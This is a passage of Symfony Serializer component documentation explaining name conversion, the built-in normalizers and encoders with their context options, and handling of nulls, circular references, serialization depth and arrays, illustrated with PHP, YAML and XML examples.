    $kevin = new Person('Kévin');
    $normalizer->normalize($kevin);
    // ['first_name' => 'Kévin'];

    $anne = $normalizer->denormalize(['first_name' => 'Anne'], 'Person');
    // Person object with firstName: 'Anne'

.. _serializer_name-conversion:

Configure name conversion using metadata
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When using this component inside a Symfony application and the class metadata
factory is enabled as explained in the :ref:`Attributes Groups section <component-serializer-attributes-groups>`,
this is already set up and you only need to provide the configuration. Otherwise::

    // ...
    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\NameConverter\MetadataAwareNameConverter;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());

    $metadataAwareNameConverter = new MetadataAwareNameConverter($classMetadataFactory);

    $serializer = new Serializer(
        [new ObjectNormalizer($classMetadataFactory, $metadataAwareNameConverter)],
        ['json' => new JsonEncoder()]
    );

Now configure your name conversion mapping. Consider an application that
defines a ``Person`` entity with a ``firstName`` property:

.. configuration-block::

    .. code-block:: php-attributes

        namespace App\Entity;

        use Symfony\Component\Serializer\Annotation\SerializedName;

        class Person
        {
            public function __construct(
                #[SerializedName('customer_name')]
                private string $firstName,
            ) {
            }

            // ...
        }

    .. code-block:: yaml

        App\Entity\Person:
            attributes:
                firstName:
                    serialized_name: customer_name

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="App\Entity\Person">
                <attribute name="firstName" serialized-name="customer_name"/>
            </class>
        </serializer>

This custom mapping is used to convert property names when serializing and
deserializing objects::

    $serialized = $serializer->serialize(new Person('Kévin'), 'json');
    // {"customer_name": "Kévin"}

.. _serializing-boolean-attributes:

Handling Boolean Attributes And Values
--------------------------------------

During Serialization
~~~~~~~~~~~~~~~~~~~~

If you are using isser methods (methods prefixed by ``is``, like
``App\Model\Person::isSportsperson()``), the Serializer component will
automatically detect and use it to serialize related attributes.

The ``ObjectNormalizer`` also takes care of methods starting with ``has``, ``get``,
and ``can``.

During Deserialization
~~~~~~~~~~~~~~~~~~~~~~

PHP considers many different values as true or false. For example, the
strings ``true``, ``1``, and ``yes`` are considered true, while
``false``, ``0``, and ``no`` are considered false.

When deserializing, the Serializer component can take care of this
automatically. This can be done by using the ``AbstractNormalizer::FILTER_BOOL``
context option::

    use Acme\Person;
    use Symfony\Component\Serializer\Normalizer\AbstractNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $normalizer = new ObjectNormalizer();
    $serializer = new Serializer([$normalizer]);

    $data = $serializer->denormalize(['sportsperson' => 'yes'], Person::class, context: [AbstractNormalizer::FILTER_BOOL => true]);

This context makes the deserialization process behave like the
:phpfunction:`filter_var` function with the ``FILTER_VALIDATE_BOOL`` flag.

.. versionadded:: 7.1

    The ``AbstractNormalizer::FILTER_BOOL`` context option was introduced in Symfony 7.1.

Using Callbacks to Serialize Properties with Object Instances
-------------------------------------------------------------

When serializing, you can set a callback to format a specific object property::

    use App\Model\Person;
    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Normalizer\GetSetMethodNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $encoder = new JsonEncoder();

    // all callback parameters are optional (you can omit the ones you don't use)
    $dateCallback = function (object $innerObject, object $outerObject, string $attributeName, ?string $format = null, array $context = []): string {
        return $innerObject instanceof \DateTime ? $innerObject->format(\DateTime::ISO8601) : '';
    };

    $defaultContext = [
        AbstractNormalizer::CALLBACKS => [
            'createdAt' => $dateCallback,
        ],
    ];

    $normalizer = new GetSetMethodNormalizer(null, null, null, null, null, $defaultContext);

    $serializer = new Serializer([$normalizer], [$encoder]);

    $person = new Person();
    $person->setName('cordoval');
    $person->setAge(34);
    $person->setCreatedAt(new \DateTime('now'));

    $serializer->serialize($person, 'json');
    // Output: {"name":"cordoval", "age": 34, "createdAt": "2014-03-22T09:43:12-0500"}

.. _component-serializer-normalizers:

Normalizers
-----------

Normalizers turn **objects** into **arrays** and vice versa. They implement
:class:`Symfony\\Component\\Serializer\\Normalizer\\NormalizerInterface` for
normalizing (object to array) and
:class:`Symfony\\Component\\Serializer\\Normalizer\\DenormalizerInterface` for
denormalizing (array to object).

Normalizers are enabled in the serializer passing them as its first argument::

    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $normalizers = [new ObjectNormalizer()];
    $serializer = new Serializer($normalizers, []);

Built-in Normalizers
~~~~~~~~~~~~~~~~~~~~

The Serializer component provides several built-in normalizers:

:class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`
    This normalizer leverages the :doc:`PropertyAccess Component </components/property_access>`
    to read and write in the object. It means that it can access to properties
    directly and through getters, setters, hassers, issers, canners, adders and removers.
    It supports calling the constructor during the denormalization process.

    Objects are normalized to a map of property names and values (names are
    generated by removing the ``get``, ``set``, ``has``, ``is``, ``can``, ``add`` or ``remove``
    prefix from the method name and transforming the first letter to lowercase; e.g.
    ``getFirstName()`` -> ``firstName``).

    The ``ObjectNormalizer`` is the most powerful normalizer. It is configured by
    default in Symfony applications with the Serializer component enabled.

:class:`Symfony\\Component\\Serializer\\Normalizer\\GetSetMethodNormalizer`
    This normalizer reads the content of the class by calling the "getters"
    (public methods starting with "get"). It will denormalize data by calling
    the constructor and the "setters" (public methods starting with "set").

    Objects are normalized to a map of property names and values (names are
    generated by removing the ``get`` prefix from the method name and transforming
    the first letter to lowercase; e.g. ``getFirstName()`` -> ``firstName``).

:class:`Symfony\\Component\\Serializer\\Normalizer\\PropertyNormalizer`
    This normalizer directly reads and writes public properties as well as
    **private and protected** properties (from both the class and all of its
    parent classes) by using `PHP reflection`_. It supports calling the constructor
    during the denormalization process.

    Objects are normalized to a map of property names to property values.

    If you prefer to only normalize certain properties (e.g. only public properties)
    set the ``PropertyNormalizer::NORMALIZE_VISIBILITY`` context option and
    combine the following values: ``PropertyNormalizer::NORMALIZE_PUBLIC``,
    ``PropertyNormalizer::NORMALIZE_PROTECTED`` or ``PropertyNormalizer::NORMALIZE_PRIVATE``.

:class:`Symfony\\Component\\Serializer\\Normalizer\\JsonSerializableNormalizer`
    This normalizer works with classes that implement :phpclass:`JsonSerializable`.

    It will call the :phpmethod:`JsonSerializable::jsonSerialize` method and
    then further normalize the result. This means that nested
    :phpclass:`JsonSerializable` classes will also be normalized.

    This normalizer is particularly helpful when you want to gradually migrate
    from an existing codebase using simple :phpfunction:`json_encode` to the Symfony
    Serializer by allowing you to mix which normalizers are used for which classes.

    Unlike with :phpfunction:`json_encode` circular references can be handled.

:class:`Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer`
    This normalizer converts :phpclass:`DateTimeInterface` objects (e.g.
    :phpclass:`DateTime` and :phpclass:`DateTimeImmutable`) into strings,
    integers or floats. By default, it converts them to strings using the `RFC3339`_ format.
    To convert the objects to integers or floats, set the serializer context option
    ``DateTimeNormalizer::CAST_KEY`` to ``int`` or ``float``.

    .. versionadded:: 7.1

        The ``DateTimeNormalizer::CAST_KEY`` context option was introduced in Symfony 7.1.

:class:`Symfony\\Component\\Serializer\\Normalizer\\DateTimeZoneNormalizer`
    This normalizer converts :phpclass:`DateTimeZone` objects into strings that
    represent the name of the timezone according to the `list of PHP timezones`_.

:class:`Symfony\\Component\\Serializer\\Normalizer\\DataUriNormalizer`
    This normalizer converts :phpclass:`SplFileInfo` objects into a `data URI`_
    string (``data:...``) such that files can be embedded into serialized data.

:class:`Symfony\\Component\\Serializer\\Normalizer\\DateIntervalNormalizer`
    This normalizer converts :phpclass:`DateInterval` objects into strings.
    By default, it uses the ``P%yY%mM%dDT%hH%iM%sS`` format.

:class:`Symfony\\Component\\Serializer\\Normalizer\\BackedEnumNormalizer`
    This normalizer converts a \BackedEnum objects into strings or integers.

    By default, an exception is thrown when data is not a valid backed enumeration. If you
    want ``null`` instead, you can set the ``BackedEnumNormalizer::ALLOW_INVALID_VALUES`` option.

:class:`Symfony\\Component\\Serializer\\Normalizer\\FormErrorNormalizer`
    This normalizer works with classes that implement
    :class:`Symfony\\Component\\Form\\FormInterface`.

    It will get errors from the form and normalize them into a normalized array.

:class:`Symfony\\Component\\Serializer\\Normalizer\\ConstraintViolationListNormalizer`
    This normalizer converts objects that implement
    :class:`Symfony\\Component\\Validator\\ConstraintViolationListInterface`
    into a list of errors according to the `RFC 7807`_ standard.

:class:`Symfony\\Component\\Serializer\\Normalizer\\ProblemNormalizer`
    Normalizes errors according to the API Problem spec `RFC 7807`_.

:class:`Symfony\\Component\\Serializer\\Normalizer\\CustomNormalizer`
    Normalizes a PHP object using an object that implements :class:`Symfony\\Component\\Serializer\\Normalizer\\NormalizableInterface`.

:class:`Symfony\\Component\\Serializer\\Normalizer\\UidNormalizer`
    This normalizer converts objects that extend
    :class:`Symfony\\Component\\Uid\\AbstractUid` into strings.
    The default normalization format for objects that implement :class:`Symfony\\Component\\Uid\\Uuid`
    is the `RFC 4122`_ format (example: ``d9e7a184-5d5b-11ea-a62a-3499710062d0``).
    The default normalization format for objects that implement :class:`Symfony\\Component\\Uid\\Ulid`
    is the Base 32 format (example: ``01E439TP9XJZ9RPFH3T1PYBCR8``).
    You can change the string format by setting the serializer context option
    ``UidNormalizer::NORMALIZATION_FORMAT_KEY`` to ``UidNormalizer::NORMALIZATION_FORMAT_BASE_58``,
    ``UidNormalizer::NORMALIZATION_FORMAT_BASE_32`` or ``UidNormalizer::NORMALIZATION_FORMAT_RFC_4122``.

    Also it can denormalize ``uuid`` or ``ulid`` strings to :class:`Symfony\\Component\\Uid\\Uuid`
    or :class:`Symfony\\Component\\Uid\\Ulid`. The format does not matter.

:class:`Symfony\\Component\\Serializer\\Normalizer\\TranslatableNormalizer`
    This normalizer converts objects that implement
    :class:`Symfony\\Contracts\\Translation\\TranslatableInterface` into
    translated strings, using the
    :method:`Symfony\\Contracts\\Translation\\TranslatableInterface::trans`
    method. You can define the locale to use to translate the object by
    setting the ``TranslatableNormalizer::NORMALIZATION_LOCALE_KEY`` serializer
    context option.

.. note::

    You can also create your own Normalizer to use another structure. Read more at
    :doc:`/serializer/custom_normalizer`.

Certain normalizers are enabled by default when using the Serializer component
in a Symfony application, additional ones can be enabled by tagging them with
:ref:`serializer.normalizer <reference-dic-tags-serializer-normalizer>`.

Here is an example of how to enable the built-in
:class:`Symfony\\Component\\Serializer\\Normalizer\\GetSetMethodNormalizer`, a
faster alternative to the
:class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            get_set_method_normalizer:
                class: Symfony\Component\Serializer\Normalizer\GetSetMethodNormalizer
                tags: [serializer.normalizer]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <!-- ... -->

                <service id="get_set_method_normalizer" class="Symfony\Component\Serializer\Normalizer\GetSetMethodNormalizer">
                    <tag name="serializer.normalizer"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\Serializer\Normalizer\GetSetMethodNormalizer;

        return static function (ContainerConfigurator $container): void {
            $container->services()
                // ...
                ->set('get_set_method_normalizer', GetSetMethodNormalizer::class)
                    ->tag('serializer.normalizer')
            ;
        };

.. _component-serializer-encoders:

Encoders
--------

Encoders turn **arrays** into **formats** and vice versa. They implement
:class:`Symfony\\Component\\Serializer\\Encoder\\EncoderInterface`
for encoding (array to format) and
:class:`Symfony\\Component\\Serializer\\Encoder\\DecoderInterface` for decoding
(format to array).

You can add new encoders to a Serializer instance by using its second constructor argument::

    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Encoder\XmlEncoder;
    use Symfony\Component\Serializer\Serializer;

    $encoders = [new XmlEncoder(), new JsonEncoder()];
    $serializer = new Serializer([], $encoders);

Built-in Encoders
~~~~~~~~~~~~~~~~~

The Serializer component provides several built-in encoders:

:class:`Symfony\\Component\\Serializer\\Encoder\\JsonEncoder`
    This class encodes and decodes data in `JSON`_.

:class:`Symfony\\Component\\Serializer\\Encoder\\XmlEncoder`
    This class encodes and decodes data in `XML`_.

:class:`Symfony\\Component\\Serializer\\Encoder\\YamlEncoder`
    This encoder encodes and decodes data in `YAML`_. This encoder requires the
    :doc:`Yaml Component </components/yaml>`.

:class:`Symfony\\Component\\Serializer\\Encoder\\CsvEncoder`
    This encoder encodes and decodes data in `CSV`_.

.. note::

    You can also create your own Encoder to use another structure. Read more at
    :doc:`/serializer/custom_encoders`.

All these encoders are enabled by default when using the Serializer component
in a Symfony application.

The ``JsonEncoder``
~~~~~~~~~~~~~~~~~~~

The ``JsonEncoder`` encodes to and decodes from JSON strings, based on the PHP
:phpfunction:`json_encode` and :phpfunction:`json_decode` functions. It can be
useful to modify how these functions operate in certain instances by providing
options such as ``JSON_PRESERVE_ZERO_FRACTION``. You can use the serialization
context to pass in these options using the key ``json_encode_options`` or
``json_decode_options`` respectively::

    $this->serializer->serialize($data, 'json', ['json_encode_options' => \JSON_PRESERVE_ZERO_FRACTION]);

These are the options available:

===============================  =========================================================================================================== ================================
Option                           Description                                                                                                 Default
===============================  ==========================================================================================================  ================================
``json_decode_associative``      If set to true returns the result as an array, returns a nested ``stdClass`` hierarchy otherwise.           ``false``
``json_decode_detailed_errors``  If set to true, exceptions thrown on parsing of JSON are more specific. Requires `seld/jsonlint`_ package.  ``false``
``json_decode_options``          `$flags`_ passed to :phpfunction:`json_decode` function.                                                    ``0``
``json_encode_options``          `$flags`_ passed to :phpfunction:`json_encode` function.                                                    ``\JSON_PRESERVE_ZERO_FRACTION``
``json_decode_recursion_depth``  Sets maximum recursion depth.                                                                               ``512``
===============================  ==========================================================================================================  ================================

The ``CsvEncoder``
~~~~~~~~~~~~~~~~~~

The ``CsvEncoder`` encodes to and decodes from CSV.

The ``CsvEncoder`` Context Options
..................................

The ``encode()`` method defines a third optional parameter called ``context``
which defines the configuration options for the CsvEncoder an associative array::

    $csvEncoder->encode($array, 'csv', $context);

These are the options available:

======================= =====================================================  ==========================
Option                  Description                                            Default
======================= =====================================================  ==========================
``csv_delimiter``       Sets the field delimiter separating values (one        ``,``
                        character only)
``csv_enclosure``       Sets the field enclosure (one character only)          ``"``
``csv_end_of_line``     Sets the character(s) used to mark the end of each     ``\n``
                        line in the CSV file
``csv_escape_char``     Sets the escape character (at most one character)      empty string
``csv_key_separator``   Sets the separator for array's keys during its         ``.``
                        flattening
``csv_headers``         Sets the order of the header and data columns
                        E.g.: if ``$data = ['c' => 3, 'a' => 1, 'b' => 2]``
                        and ``$options = ['csv_headers' => ['a', 'b', 'c']]``
                        then ``serialize($data, 'csv', $options)`` returns
                        ``a,b,c\n1,2,3``                                       ``[]``, inferred from input data's keys
``csv_escape_formulas`` Escapes fields containing formulas by prepending them  ``false``
                        with a ``\t`` character
``as_collection``       Always returns results as a collection, even if only   ``true``
                        one line is decoded.
``no_headers``          Setting to ``false`` will use first row as headers.    ``false``
                        ``true`` generate numeric headers.
``output_utf8_bom``     Outputs special `UTF-8 BOM`_ along with encoded data   ``false``
======================= =====================================================  ==========================

The ``XmlEncoder``
~~~~~~~~~~~~~~~~~~

This encoder transforms arrays into XML and vice versa.

For example, take an object normalized as following::

    ['foo' => [1, 2], 'bar' => true];

The ``XmlEncoder`` will encode this object like that:

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8" ?>
    <response>
        <foo>1</foo>
        <foo>2</foo>
        <bar>1</bar>
    </response>

The special ``#`` key can be used to define the data of a node::

    ['foo' => ['@bar' => 'value', '#' => 'baz']];

    // is encoded as follows:
    // <?xml version="1.0"?>
    // <response>
    //     <foo bar="value">
    //        baz
    //     </foo>
    // </response>

Furthermore, keys beginning with ``@`` will be considered attributes, and
the key  ``#comment`` can be used for encoding XML comments::

    $encoder = new XmlEncoder();
    $encoder->encode([
        'foo' => ['@bar' => 'value'],
        'qux' => ['#comment' => 'A comment'],
    ], 'xml');
    // will return:
    // <?xml version="1.0"?>
    // <response>
    //     <foo bar="value"/>
    //     <qux><!-- A comment --!><qux>
    // </response>

You can pass the context key ``as_collection`` in order to have the results
always as a collection.

.. note::

    You may need to add some attributes on the root node::

        $encoder = new XmlEncoder();
        $encoder->encode([
            '@attribute1' => 'foo',
            '@attribute2' => 'bar',
            '#' => ['foo' => ['@bar' => 'value', '#' => 'baz']]
        ], 'xml');

        // will return:
        // <?xml version="1.0"?>
        // <response attribute1="foo" attribute2="bar">
        // <foo bar="value">baz</foo>
        // </response>

.. tip::

    XML comments are ignored by default when decoding contents, but this
    behavior can be changed with the optional context key ``XmlEncoder::DECODER_IGNORED_NODE_TYPES``.

    Data with ``#comment`` keys are encoded to XML comments by default. This can be
    changed by adding the ``\XML_COMMENT_NODE`` option to the ``XmlEncoder::ENCODER_IGNORED_NODE_TYPES``
    key of the ``$defaultContext`` of the ``XmlEncoder`` constructor or
    directly to the ``$context`` argument of the ``encode()`` method::

        $xmlEncoder->encode($array, 'xml', [XmlEncoder::ENCODER_IGNORED_NODE_TYPES => [\XML_COMMENT_NODE]]);

The ``XmlEncoder`` Context Options
..................................

The ``encode()`` method defines a third optional parameter called ``context``
which defines the configuration options for the XmlEncoder an associative array::

    $xmlEncoder->encode($array, 'xml', $context);

These are the options available:

==============================  =================================================  ==========================
Option                          Description                                        Default
==============================  =================================================  ==========================
``xml_format_output``           If set to true, formats the generated XML with     ``false``
                                line breaks and indentation
``xml_version``                 Sets the XML version attribute                     ``1.0``
``xml_encoding``                Sets the XML encoding attribute                    ``utf-8``
``xml_standalone``              Adds standalone attribute in the generated XML     ``true``
``xml_type_cast_attributes``    This provides the ability to forget the attribute  ``true``
                                type casting
``xml_root_node_name``          Sets the root node name                            ``response``
``as_collection``               Always returns results as a collection, even if    ``false``
                                only one line is decoded
``decoder_ignored_node_types``  Array of node types (`DOM XML_* constants`_)       ``[\XML_PI_NODE, \XML_COMMENT_NODE]``
                                to be ignored while decoding
``encoder_ignored_node_types``  Array of node types (`DOM XML_* constants`_)       ``[]``
                                to be ignored while encoding
``load_options``                XML loading `options with libxml`_                 ``\LIBXML_NONET | \LIBXML_NOBLANKS``
``save_options``                XML saving `options with libxml`_                  ``0``
``remove_empty_tags``           If set to true, removes all empty tags in the      ``false``
                                generated XML
==============================  =================================================  ==========================

Example with custom ``context``::

    use Symfony\Component\Serializer\Encoder\XmlEncoder;

    // create encoder with specified options as new default settings
    $xmlEncoder = new XmlEncoder(['xml_format_output' => true]);

    $data = [
        'id' => 'IDHNQIItNyQ',
        'date' => '2019-10-24',
    ];

    // encode with default context
    $xmlEncoder->encode($data, 'xml');
    // outputs:
    // <?xml version="1.0"?>
    // <response>
    //   <id>IDHNQIItNyQ</id>
    //   <date>2019-10-24</date>
    // </response>

    // encode with modified context
    $xmlEncoder->encode($data, 'xml', [
        'xml_root_node_name' => 'track',
        'encoder_ignored_node_types' => [
            \XML_PI_NODE, // removes XML declaration (the leading xml tag)
        ],
    ]);
    // outputs:
    // <track>
    //   <id>IDHNQIItNyQ</id>
    //   <date>2019-10-24</date>
    // </track>

The ``YamlEncoder``
~~~~~~~~~~~~~~~~~~~

This encoder requires the :doc:`Yaml Component </components/yaml>` and
transforms from and to Yaml.

The ``YamlEncoder`` Context Options
...................................

The ``encode()`` method, like other encoder, uses ``context`` to set
configuration options for the YamlEncoder an associative array::

    $yamlEncoder->encode($array, 'yaml', $context);

These are the options available:

=============== ========================================================  ==========================
Option          Description                                               Default
=============== ========================================================  ==========================
``yaml_inline`` The level where you switch to inline YAML                 ``0``
``yaml_indent`` The level of indentation (used internally)                ``0``
``yaml_flags``  A bit field of ``Yaml::DUMP_*`` / ``PARSE_*`` constants   ``0``
                to customize the encoding / decoding YAML string
=============== ========================================================  ==========================

.. _component-serializer-context-builders:

Context Builders
----------------

Instead of passing plain PHP arrays to the :ref:`serialization context <serializer_serializer-context>`,
you can use "context builders" to define the context using a fluent interface::

    use Symfony\Component\Serializer\Context\Encoder\CsvEncoderContextBuilder;
    use Symfony\Component\Serializer\Context\Normalizer\ObjectNormalizerContextBuilder;

    $initialContext = [
        'custom_key' => 'custom_value',
    ];

    $contextBuilder = (new ObjectNormalizerContextBuilder())
        ->withContext($initialContext)
        ->withGroups(['group1', 'group2']);

    $contextBuilder = (new CsvEncoderContextBuilder())
        ->withContext($contextBuilder)
        ->withDelimiter(';');

    $serializer->serialize($something, 'csv', $contextBuilder->toArray());

.. note::

    The Serializer component provides a context builder
    for each :ref:`normalizer <component-serializer-normalizers>`
    and :ref:`encoder <component-serializer-encoders>`.

    You can also :doc:`create custom context builders </serializer/custom_context_builders>`
    to deal with your context values.

Skipping ``null`` Values
------------------------

By default, the Serializer will preserve properties containing a ``null`` value.
You can change this behavior by setting the ``AbstractObjectNormalizer::SKIP_NULL_VALUES`` context option
to ``true``::

    $dummy = new class {
        public ?string $foo = null;
        public string $bar = 'notNull';
    };

    $normalizer = new ObjectNormalizer();
    $result = $normalizer->normalize($dummy, 'json', [AbstractObjectNormalizer::SKIP_NULL_VALUES => true]);
    // ['bar' => 'notNull']

Require all Properties
----------------------

By default, the Serializer will add ``null`` to nullable properties when the parameters for those are not provided.
You can change this behavior by setting the ``AbstractNormalizer::REQUIRE_ALL_PROPERTIES`` context option
to ``true``::

    class Dummy
    {
        public function __construct(
            public string $foo,
            public ?string $bar,
        ) {
        }
    }

    $data = ['foo' => 'notNull'];

    $normalizer = new ObjectNormalizer();
    $result = $normalizer->denormalize($data, Dummy::class, 'json', [AbstractNormalizer::REQUIRE_ALL_PROPERTIES => true]);
    // throws Symfony\Component\Serializer\Exception\MissingConstructorArgumentException

Skipping Uninitialized Properties
---------------------------------

In PHP, typed properties have an ``uninitialized`` state which is different
from the default ``null`` of untyped properties. When you try to access a typed
property before giving it an explicit value, you get an error.

To avoid the Serializer throwing an error when serializing or normalizing an
object with uninitialized properties, by default the object normalizer catches
these errors and ignores such properties.

You can disable this behavior by setting the ``AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES``
context option to ``false``::

    class Dummy {
        public string $foo = 'initialized';
        public string $bar; // uninitialized
    }

    $normalizer = new ObjectNormalizer();
    $result = $normalizer->normalize(new Dummy(), 'json', [AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES => false]);
    // throws Symfony\Component\PropertyAccess\Exception\UninitializedPropertyException as normalizer cannot read uninitialized properties

.. note::

    Calling ``PropertyNormalizer::normalize`` or ``GetSetMethodNormalizer::normalize``
    with ``AbstractObjectNormalizer::SKIP_UNINITIALIZED_VALUES`` context option set
    to ``false`` will throw an ``\Error`` instance if the given object has uninitialized
    properties as the normalizer cannot read them (directly or via getter/isser methods).

.. _component-serializer-handling-circular-references:

Collecting Type Errors While Denormalizing
------------------------------------------

When denormalizing a payload to an object with typed properties, you'll get an
exception if the payload contains properties that don't have the same type as
the object.

In those situations, use the ``COLLECT_DENORMALIZATION_ERRORS`` option to
collect all exceptions at once, and to get the object partially denormalized::

    try {
        $dto = $serializer->deserialize($request->getContent(), MyDto::class, 'json', [
            DenormalizerInterface::COLLECT_DENORMALIZATION_ERRORS => true,
        ]);
    } catch (PartialDenormalizationException $e) {
        $violations = new ConstraintViolationList();
        /** @var NotNormalizableValueException $exception */
        foreach ($e->getErrors() as $exception) {
            $message = sprintf('The type must be one of "%s" ("%s" given).', implode(', ', $exception->getExpectedTypes()), $exception->getCurrentType());
            $parameters = [];
            if ($exception->canUseMessageForUser()) {
                $parameters['hint'] = $exception->getMessage();
            }
            $violations->add(new ConstraintViolation($message, '', $parameters, null, $exception->getPath(), null));
        }

        return $this->json($violations, 400);
    }

Handling Circular References
----------------------------

Circular references are common when dealing with entity relations::

    class Organization
    {
        private string $name;
        private array $members;

        public function setName($name): void
        {
            $this->name = $name;
        }

        public function getName(): string
        {
            return $this->name;
        }

        public function setMembers(array $members): void
        {
            $this->members = $members;
        }

        public function getMembers(): array
        {
            return $this->members;
        }
    }

    class Member
    {
        private string $name;
        private Organization $organization;

        public function setName(string $name): void
        {
            $this->name = $name;
        }

        public function getName(): string
        {
            return $this->name;
        }

        public function setOrganization(Organization $organization): void
        {
            $this->organization = $organization;
        }

        public function getOrganization(): Organization
        {
            return $this->organization;
        }
    }

To avoid infinite loops, :class:`Symfony\\Component\\Serializer\\Normalizer\\GetSetMethodNormalizer`
or :class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`
throw a :class:`Symfony\\Component\\Serializer\\Exception\\CircularReferenceException`
when such a case is encountered::

    $member = new Member();
    $member->setName('Kévin');

    $organization = new Organization();
    $organization->setName('Les-Tilleuls.coop');
    $organization->setMembers([$member]);

    $member->setOrganization($organization);

    echo $serializer->serialize($organization, 'json'); // Throws a CircularReferenceException

The key ``circular_reference_limit`` in the default context sets the number of
times it will serialize the same object before considering it a circular
reference. The default value is ``1``.

Instead of throwing an exception, circular references can also be handled
by custom callables. This is especially useful when serializing entities
having unique identifiers::

    $encoder = new JsonEncoder();
    $defaultContext = [
        AbstractNormalizer::CIRCULAR_REFERENCE_HANDLER => function (object $object, string $format, array $context): string {
            return $object->getName();
        },
    ];
    $normalizer = new ObjectNormalizer(null, null, null, null, null, null, $defaultContext);

    $serializer = new Serializer([$normalizer], [$encoder]);
    var_dump($serializer->serialize($org, 'json'));
    // {"name":"Les-Tilleuls.coop","members":[{"name":"K\u00e9vin", organization: "Les-Tilleuls.coop"}]}

.. _serializer_handling-serialization-depth:

Handling Serialization Depth
----------------------------

The Serializer component is able to detect and limit the serialization depth.
It is especially useful when serializing large trees. Assume the following data
structure::

    namespace Acme;

    class MyObj
    {
        public string $foo;

        /**
         * @var self
         */
        public MyObj $child;
    }

    $level1 = new MyObj();
    $level1->foo = 'level1';

    $level2 = new MyObj();
    $level2->foo = 'level2';
    $level1->child = $level2;

    $level3 = new MyObj();
    $level3->foo = 'level3';
    $level2->child = $level3;

The serializer can be configured to set a maximum depth for a given property.
Here, we set it to 2 for the ``$child`` property:

.. configuration-block::

    .. code-block:: php-attributes

        namespace Acme;

        use Symfony\Component\Serializer\Annotation\MaxDepth;

        class MyObj
        {
            #[MaxDepth(2)]
            public MyObj $child;

            // ...
        }

    .. code-block:: yaml

        Acme\MyObj:
            attributes:
                child:
                    max_depth: 2

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="Acme\MyObj">
                <attribute name="child" max-depth="2"/>
            </class>
        </serializer>

The metadata loader corresponding to the chosen format must be configured in
order to use this feature. It is done automatically when using the Serializer component
in a Symfony application. When using the standalone component, refer to
:ref:`the groups documentation <component-serializer-attributes-groups>` to
learn how to do that.

The check is only done if the ``AbstractObjectNormalizer::ENABLE_MAX_DEPTH`` key of the serializer context
is set to ``true``. In the following example, the third level is not serialized
because it is deeper than the configured maximum depth of 2::

    $result = $serializer->normalize($level1, null, [AbstractObjectNormalizer::ENABLE_MAX_DEPTH => true]);
    /*
    $result = [
        'foo' => 'level1',
        'child' => [
            'foo' => 'level2',
            'child' => [
                'child' => null,
            ],
        ],
    ];
    */

Instead of throwing an exception, a custom callable can be executed when the
maximum depth is reached. This is especially useful when serializing entities
having unique identifiers::

    use Symfony\Component\Serializer\Annotation\MaxDepth;
    use Symfony\Component\Serializer\Mapping\Factory\ClassMetadataFactory;
    use Symfony\Component\Serializer\Mapping\Loader\AttributeLoader;
    use Symfony\Component\Serializer\Normalizer\AbstractObjectNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    class Foo
    {
        public int $id;

        #[MaxDepth(1)]
        public MyObj $child;
    }

    $level1 = new Foo();
    $level1->id = 1;

    $level2 = new Foo();
    $level2->id = 2;
    $level1->child = $level2;

    $level3 = new Foo();
    $level3->id = 3;
    $level2->child = $level3;

    $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());

    // all callback parameters are optional (you can omit the ones you don't use)
    $maxDepthHandler = function (object $innerObject, object $outerObject, string $attributeName, ?string $format = null, array $context = []): string {
        return '/foos/'.$innerObject->id;
    };

    $defaultContext = [
        AbstractObjectNormalizer::MAX_DEPTH_HANDLER => $maxDepthHandler,
    ];
    $normalizer = new ObjectNormalizer($classMetadataFactory, null, null, null, null, null, $defaultContext);

    $serializer = new Serializer([$normalizer]);

    $result = $serializer->normalize($level1, null, [AbstractObjectNormalizer::ENABLE_MAX_DEPTH => true]);
    /*
    $result = [
        'id' => 1,
        'child' => [
            'id' => 2,
            'child' => '/foos/3',
        ],
    ];
    */

Handling Arrays
---------------

The Serializer component is capable of handling arrays of objects as well.
Serializing arrays works just like serializing a single object::

    use Acme\Person;

    $person1 = new Person();
    $person1->setName('foo');
    $person1->setAge(99);
    $person1->setSportsman(false);

